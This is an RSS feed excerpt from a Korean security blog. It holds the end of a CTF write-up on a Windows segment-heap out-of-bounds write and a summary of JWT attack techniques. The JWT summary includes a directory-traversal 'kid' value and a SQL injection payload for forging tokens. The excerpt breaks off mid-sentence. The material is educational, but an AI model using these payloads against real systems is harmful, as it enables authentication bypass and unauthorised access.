&#xC720;&#xCD94;&#xD574;&#xBCF4;&#xBA74;, &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xD544;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xCCB4;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Storage</span> {</span>    <span class="hljs-keyword">int64_t</span> type; <span class="hljs-comment">//&#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0; &#xD0C0;&#xC785;</span>    <span class="hljs-keyword">int64_t</span> is_allocated; <span class="hljs-comment">// &#xD560;&#xB2F9;&#xC5EC;&#xBD80;</span>    LPVOID heap_ptr; <span class="hljs-comment">// &#xD560;&#xB2F9;&#xB41C; &#xD799; &#xD3EC;&#xC778;&#xD130;</span>};</code></pre><p><img src="/2021/11/21/l0ch/segment-heap-part3/%ED%99%94%EB%A9%B4_%EC%BA%A1%EC%B2%98_2021-11-21_123751.png" alt="&#xD654;&#xBA74; &#xCEA1;&#xCC98; 2021-11-21 123751.png"></p><p><img src="/2021/11/21/l0ch/segment-heap-part3/111.png" alt="111.png"></p><p>&#xCC28;&#xB840;&#xB300;&#xB85C; &#xD0C0;&#xC785;, &#xD560;&#xB2F9;&#xC5EC;&#xBD80;, &#xD560;&#xB2F9;&#xB41C; &#xD799; &#xC8FC;&#xC18C;&#xAE4C;&#xC9C0; &#xC800;&#xC7A5;&#xB418;&#xB294;&#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798; chunk_size &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xB294; &#xC778;&#xB371;&#xC2A4;&#xBCC4; &#xD560;&#xB2F9;&#xB41C; size&#xAC00; &#xC800;&#xC7A5;&#xC774; &#xB418;&#xB124;&#xC694;.</p><p>2&#xBC88; &#xBA54;&#xB274;&#xB294; &#xD560;&#xB2F9;&#xD55C; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xC5D0; &#xAC12;&#xC744; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xD0C0;&#xC785;&#xBCC4;&#xB85C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xAC12; &#xC720;&#xD615;&#xC774; &#xB2E4;&#xB978;&#xB370;,  &#xBD84;&#xC11D;&#xD574; &#xAC01;&#xAC01;&#xC758; &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC720;&#xCD94;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xB098;&#xD0C0;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">int_storage</span> {</span> <span class="hljs-comment">//type 0</span>    <span class="hljs-keyword">size_t</span> size;    int32 uintarray[<span class="hljs-number">1</span>];};<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">secret_storage</span> {</span> <span class="hljs-comment">//type 1</span>    int32 size;    uint64 uintarray[<span class="hljs-number">1</span>];};<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">binary_storage</span> {</span> <span class="hljs-comment">//type 2</span>    <span class="hljs-keyword">size_t</span> size;    <span class="hljs-keyword">char</span> content[<span class="hljs-number">1</span>];};<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">string_storage</span> {</span> <span class="hljs-comment">//type 3</span><span class="hljs-keyword">size_t</span> size;<span class="hljs-keyword">char</span>* <span class="hljs-built_in">string</span>;};</code></pre><p>3&#xBC88; &#xBA54;&#xB274;&#xC778; Get value from storage&#xC740; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xC758; &#xAC12;&#xC744; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294;&#xB370;, 3&#xBC88; &#xD0C0;&#xC785;&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xB9CC; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; 4&#xBC88; Destory storage&#xB294; &#xC785;&#xB825;&#xD55C; &#xC778;&#xB371;&#xC2A4;&#xC758; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xC5D0; &#xD560;&#xB2F9;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xACE0; &#xC0AD;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; 2&#xBC88; &#xBA54;&#xB274;&#xC758; &#xD0C0;&#xC785; 1 &#xAC12;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xACF3;&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">__int64 input_value;sub_7FF6203D1060(<span class="hljs-string">&quot;Index:&quot;</span>);index = sub_7FF6203D1210();<span class="hljs-keyword">if</span> ( index &gt;= <span class="hljs-number">512</span> ){<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound&quot;</span>);<span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);}sub_7FF6203D1060(<span class="hljs-string">&quot;Value:&quot;</span>);input_value = sub_7FF6203D1210();*(Storage[storage_index].heap_ptr-&gt;uintarray[index+<span class="hljs-number">1</span>]) = input_value;</code></pre><p>index&#xAC00; &#xD560;&#xB2F9;&#xB41C; &#xD06C;&#xAE30;&#xC778; 512&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xD06C;&#xBA74; &#xC885;&#xB8CC;&#xD558;&#xB294; OOB &#xAC80;&#xC0AC;&#xAC00; &#xC788;&#xB124;&#xC694;. &#xADF8;&#xB7F0;&#xB370; index&#xAC00; &#xC74C;&#xC218;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD560;&#xB2F9;&#xB41C; &#xD799;&#xBCF4;&#xB2E4; &#xB0AE;&#xC740; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xC785;&#xB825;&#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC5B4; OOB Write &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/11/21/l0ch/segment-heap-part3/Untitled%204.png" alt="Untitled"></p><p>&#xC2E4;&#xC81C;&#xB85C; &#xD0C0;&#xC785; 1&#xB85C; &#xD560;&#xB2F9;&#xD55C; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0;&#xC758; -17 &#xC778;&#xB371;&#xC2A4;&#xC5D0; 0xDEADBEEF&#xC758; &#xC815;&#xC218;&#xAC12;&#xC778; 3735927559&#xB97C; &#xB123;&#xC73C;&#xBA74;?</p><p><img src="/2021/11/21/l0ch/segment-heap-part3/Untitled%205.png" alt="Untitled"></p><p>&#xC774;&#xB807;&#xAC8C;, &#xD560;&#xB2F9;&#xB41C; &#xD799;&#xC774; &#xC544;&#xB2CC; &#xACF5;&#xAC04;&#xC5D0; &#xC784;&#xC758;&#xC758; &#xAC12;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; OOB write &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC138;&#xADF8;&#xBA3C;&#xD14C;&#xC774;&#xC158;&#xC758; &#xD799; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xC774;&#xC6A9;&#xD574;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB9AD;&#xD558;&#xACE0; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf</a></p><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf</a></p><p>[<a href="https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1?slide=207">https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-part-1?slide=207</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap/">heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/research/">research</category>
      
      <category domain="https://hackyboiz.github.io/tags/hitcon/">hitcon</category>
      
      <category domain="https://hackyboiz.github.io/tags/segment-heap/">segment heap</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-10/">windows 10</category>
      
      
      <comments>https://hackyboiz.github.io/2021/11/21/l0ch/segment-heap-part3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Hacking JSON Web Tokens (JWTs)</title>
      <link>https://hackyboiz.github.io/2021/11/20/in0hack/2021-11-20/</link>
      <guid>https://hackyboiz.github.io/2021/11/20/in0hack/2021-11-20/</guid>
      <pubDate>Sat, 20 Nov 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://showy-money-ab2.notion.site/Hacking-JSON-We</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://showy-money-ab2.notion.site/Hacking-JSON-Web-Tokens-JWTs-0792026606194f1b8a6e0d083dc83e03#02be1c3a401847768d256aba5e47912f">Hacking JSON Web Tokens (JWTs)</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Web, JWT</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>JSON &#xC6F9; &#xD1A0;&#xD070;(JWT)&#xC740; &#xC0C1;&#xC6A9; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xB110;&#xB9AC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC561;&#xC138;&#xC2A4; &#xD1A0;&#xD070; &#xC720;&#xD615;&#xC785;&#xB2C8;&#xB2E4;. JSON &#xD615;&#xC2DD;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xBA70; &#xD1A0;&#xD070;&#xC758; &#xBB34;&#xACB0;&#xC131;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD1A0;&#xD070; &#xC11C;&#xBA85;&#xC744; &#xD3EC;&#xD568;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD3EC;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; JSON &#xC6F9; &#xD1A0;&#xD070;(&#xBC0F; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC11C;&#xBA85; &#xAE30;&#xBC18; &#xD1A0;&#xD070;) &#xC0AC;&#xC6A9;&#xC758; &#xBCF4;&#xC548; &#xC601;&#xD5A5;&#xACFC; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC561;&#xC138;&#xC2A4; &#xC81C;&#xC5B4;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC774;&#xC57C;&#xAE30;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>JWT&#xB294; &#xD5E4;&#xB354;, &#xD398;&#xC774;&#xB85C;&#xB4DC;, &#xC11C;&#xBA85;&#xC758; &#xC138;&#xAC1C;&#xC758; &#xAD6C;&#xC870;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA70; &#xAC01; &#xB370;&#xC774;&#xD130;&#xB97C; Base64URL&#xB85C; &#xC778;&#xCF54;&#xB529;&#xD574;  &#x201C;.&#x201D;&#xB85C; &#xC5F0;&#xACB0;&#xD558;&#xC5EC; &#xC644;&#xC804;&#xD55C; &#xD1A0;&#xD070;&#xC744; &#xC5BB;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs brainfuck"><span class="hljs-title">[</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">&#xD5E4;&#xB354;</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-title">]</span><span class="hljs-string">.</span><span class="hljs-title">[</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">&#xD398;&#xC774;&#xB85C;&#xB4DC;</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-title">]</span><span class="hljs-string">.</span><span class="hljs-title">[</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">&#xC11C;&#xBA85;</span>--<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-title">]</span><span class="hljs-comment">eyBhbGcgOiBIUzI1NiwgdHlwIDogSldUIH0K</span><span class="hljs-string">.</span><span class="hljs-comment">eyB1c2VyX25hbWUgOiBhZG1pbiB9Cg</span><span class="hljs-string">.</span><span class="hljs-comment">4Hb/6ibbViPOzq9SJflsNGPWSk6B8F6EqVrkNjpXh7M</span></code></pre><p>JWT&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xD574;&#xD0B9; &#xACF5;&#xACA9; &#xC720;&#xD615;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>Change up the algorithm type:</strong> &#xD5E4;&#xB354;&#xC758; <code>alg</code> &#xD544;&#xB4DC;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li>None algorithm : <code>alg</code> &#xD544;&#xB4DC;&#xAC00; <code>&quot;none&quot;</code>&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; &#xC11C;&#xBA85; &#xC139;&#xC158;&#xC774; &#xBE44;&#xC5B4; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC774; &#xC720;&#xD6A8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xAC04;&#xC8FC;&#xB429;&#xB2C8;&#xB2E4;</li><li>HMAC algorithm : <code>HMAC</code> &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xB3D9;&#xC77C;&#xD55C; &#xD0A4;&#xB85C; &#xC11C;&#xBA85;/&#xAC80;&#xC99D;&#xB429;&#xB2C8;&#xB2E4;. <code>RSA</code>&#xC758; &#xACBD;&#xC6B0; &#xD1A0;&#xD070;&#xC740; &#xBA3C;&#xC800; &#xAC1C;&#xC778; &#xD0A4;&#xB85C; &#xC0DD;&#xC131;&#xB41C; &#xB2E4;&#xC74C; &#xD574;&#xB2F9; &#xACF5;&#xAC1C; &#xD0A4;&#xB85C; &#xD655;&#xC778;&#xB429;&#xB2C8;&#xB2E4;. <code>RSA</code> &#xC554;&#xD638;&#xB85C; &#xAD6C;&#xD604; &#xB418;&#xC5B4; &#xC788;&#xB354;&#xB77C;&#xB3C4;, <code>HAMC</code>&#xC554;&#xD638;&#xD654;&#xB85C; &#xBA85;&#xC2DC;&#xD558;&#xBA74; &#xACF5;&#xAC1C;&#xD0A4;&#xB85C; &#xC554;&#xD638;&#xD654; &#xD574;&#xC11C; &#xB118;&#xAE30;&#xB354;&#xB77C;&#xB3C4; &#xACF5;&#xAC1C;&#xD0A4;&#xB85C; &#xD655;&#xC778;&#xD558;&#xAE30;&#xB54C;&#xBB38;&#xC5D0; &#xD0A4; &#xAC80;&#xC99D;&#xC774; &#xD1B5;&#xACFC;&#xB429;&#xB2C8;&#xB2E4;.</li></ol></li><li><p><strong>Provide a non-valid signature:</strong> &#xD1A0;&#xD070;&#xC758; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xC744; &#xACBD;&#xC6B0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC798;&#xBABB;&#xB41C; &#xC11C;&#xBA85;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC5EC; &#xBCF4;&#xC548; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xAC04;&#xB2E8;&#xD788; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Bruteforce the secret key:</strong> JWT&#xC5D0; &#xC11C;&#xBA85; &#xC54C;&#xACE0;&#xB9AC;&#xC998;, &#xD398;&#xC774;&#xB85C;&#xB4DC;, &#xACB0;&#xACFC; &#xC11C;&#xBA85;&#xC744; &#xC54C;&#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xD0A4;&#xB97C; &#xBB34;&#xCC28;&#xBCC4; &#xB300;&#xC785;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>Leak the secret key:</strong> &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD0A4; &#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xC218; &#xC788;&#xB294; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;(&#xC608;: &#xB514;&#xB809;&#xD130;&#xB9AC; &#xD0D0;&#xC0C9;, XXE, SSRF)&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD0A4;&#xB97C; &#xD6D4;&#xCE58;&#xACE0; &#xC784;&#xC758;&#xC758; &#xD1A0;&#xD070;&#xC5D0; &#xC11C;&#xBA85;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>KID manipulation:</strong> <code>KID</code>&#xB294; &#x201C;&#xD0A4; ID&#x201D;&#xB97C; &#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. JWT&#xC758; &#xC120;&#xD0DD;&#xC801; &#xD5E4;&#xB354; &#xD544;&#xB4DC;&#xC774;&#xBA70; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xD1A0;&#xD070; &#xD655;&#xC778;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xD0A4;&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>Directory traversal: <code>KID</code>&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xD0A4; &#xD30C;&#xC77C;&#xC744; &#xAC80;&#xC0C9;&#xD558;&#xB294; &#xB370; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0AC;&#xC6A9; &#xC804;&#xC5D0; &#xC0AD;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xD0D0;&#xC0C9; &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xD1A0;&#xD070;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD560; &#xD0A4;&#xB85C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gradle">&#x201C;kid&#x201D;: &#x201C;..<span class="hljs-regexp">/../</span><span class="hljs-keyword">public</span><span class="hljs-regexp">/css/m</span>ain.css&#x201D; <span class="hljs-comment">// use the publicly available file main.css to verify the token</span></code></pre></li><li><p>SQL Injection: <code>KID</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xD0A4;&#xB97C; &#xAC80;&#xC0C9;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; SQL Injection&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; JWT &#xC11C;&#xBA85;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs livecodeserver">&#x201C;kid&#x201D;: <span class="hljs-string">&quot;aaaaaaa&apos; UNION SELECT &apos;key&apos;;--&quot;</span>// use <span class="hljs-keyword">the</span> <span class="hljs-keyword">string</span> <span class="hljs-string">&quot;key&quot;</span> <span class="hljs-built_in">to</span> verify <span class="hljs-keyword">the</span> <span class="hljs-keyword">token</span></code></pre><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC704;&#xC758; &#xC0BD;&#xC785;&#xC740; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xBB38;&#xC790;&#xC5F4; &#x201C;key&#x201D;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#x201C;key&#x201D; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBE44;&#xBC00; &#xD0A4;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD1A0;&#xD070;&#xC744; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol></li><li><p><strong>Header parameter manipulation:</strong> <code>KID</code>&#xC678;&#xC5D0;&#xB3C4; JSON &#xC6F9; &#xD1A0;&#xD070; &#xD45C;&#xC900;&#xC740; &#xAC1C;&#xBC1C;&#xC790;&#xC5D0;&#xAC8C; URL&#xC744; &#xD1B5;&#xD574; &#xD0A4;&#xB97C; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xB3C4; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>JKU header parameter: JKU&#xB294; &#x201C;JWK Set URL&#x201D;&#xC758; &#xC57D;&#xC790;&#xB85C; &#xD1A0;&#xD070;&#xAC80;&#xC99D;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD0A4; &#xC9D1;&#xD569;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; URL&#xC744; &#xBA85;&#xC2DC;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC120;&#xD0DD;&#xC801; &#xD5E4;&#xB354; &#xD544;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC790;&#xCCB4; &#xD0A4; &#xD30C;&#xC77C;&#xC744; &#xD638;&#xC2A4;&#xD305;&#xD558;&#xACE0; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC774; &#xC774;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD1A0;&#xD070;&#xC744; &#xD655;&#xC778;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>JWK header parameter: JWK(JSON Web Key) &#xD5E4;&#xB354; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD1A0;&#xD070;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD0A4;&#xB97C; &#xD1A0;&#xD070;&#xC5D0; &#xC9C1;&#xC811; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>X5U, X5C URL manipulation: JKU &#xBC0F; JWK &#xD5E4;&#xB354;&#xC640; &#xC720;&#xC0AC;&#xD55C; X5U &#xBC0F; X5C &#xD5E4;&#xB354; &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD1A0;&#xD070;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xACF5;&#xAC1C; &#xD0A4; &#xC778;&#xC99D;&#xC11C; &#xB610;&#xB294; &#xC778;&#xC99D;&#xC11C; &#xCCB4;&#xC778;&#xC744; &#xC9C0;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ol></li><li><p><strong>Other JWT security issues:</strong> &#xAD6C;&#xD604;&#xC774; &#xC798;&#xBABB; &#xB418;&#xC5C8;&#xC744;&#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB2E4;&#xB978; JWT &#xBB38;&#xC81C;&#xB3C4; 